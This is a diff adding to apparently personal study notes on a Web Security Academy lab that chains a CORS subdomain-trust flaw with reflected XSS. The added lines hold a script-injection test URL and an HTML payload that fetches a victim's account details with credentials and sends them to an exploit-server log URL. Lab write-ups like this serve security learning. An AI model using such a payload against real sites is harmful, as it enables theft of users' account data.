@@ -92,3 +92,16 @@ The application responds with:
 HTTP/1.1 200 OK 
 Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com Access-Control-Allow-Credentials: true
 ```
+
+![[Pasted image 20250129105731.png]]
+### XSS
+```
+http://stock.0aa6008303dee18f80f021c700ac0029.web-security-academy.net/?productId=1%3Cscript%3Ealert()%3C/script%3E&storeId=1
+```
+
+```html
+<script>
+    document.location="http://stock.0aa6008303dee18f80f021c700ac0029.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0aa6008303dee18f80f021c700ac0029.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0aa90088036ce16b80c920c301c200f2.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+```
+
